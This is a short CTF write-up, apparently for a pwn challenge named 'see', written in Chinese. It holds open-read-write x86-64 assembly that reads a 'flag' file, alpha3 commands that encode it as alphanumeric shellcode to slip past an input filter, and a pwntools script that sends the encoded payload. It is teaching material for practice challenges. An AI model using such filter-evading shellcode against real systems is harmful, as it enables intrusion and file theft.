# see

题目会对输入的shellcode进行检测，开了沙箱，用alpha3生成orw的shellcode即可

<!-- __ctype_b_loc函数为其自己实现的，主要获取一个数组列表，可容纳-128~255范围的字符，对应字符值索引可获取到本地语言的字符集，对于要求的字符与掩码位求与即可得到该字符是否为某种掩码位类型的字符 -->

![image-20221008001652772](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20221008001652772.png) 

```python
from pwn import *
context.arch='amd64'
sc = '''
;// orw
    mov eax, 0x67616c662f ;// flag
    push rax

    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ;// open

    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    syscall ;// write open() return value

    pop rax
    test rax, rax
    js over

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x01010201
    sub edx, 0x01010101
    xor eax, eax
    syscall ;// read

    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    syscall ;// write

over:
    xor edi, edi
    mov eax, 0x010101e8
    sub eax, 0x01010101
    syscall ;// exit
'''
print asm(sc)
```

```bash
python sc.py > ./alpha3/shellcode
cd alpha3
./shellcode_x64.sh rdx
```



```python
# _*_ coding:utf-8 _*_
from pwn import *
import sys
import struct
import os
import hashlib
from hashlib import sha256

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-h']

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./see")
elf = ELF("./see")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ru("can u see me ?\n")
pay = "Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M3e0U190Q020a0q4y4v113b4y375p0s7k1L0d7n4x3G12325M5K8L3g5L4w4B1K080n0i144u340O0O5M5O1K8N3G4H0200040L4t31090M020f144L7k0r5M5p0y3R3F19404Q403p3f7k010D8L4L3H0N010N2x0L040N000D7m0D03"
sl(pay)
ia()
```

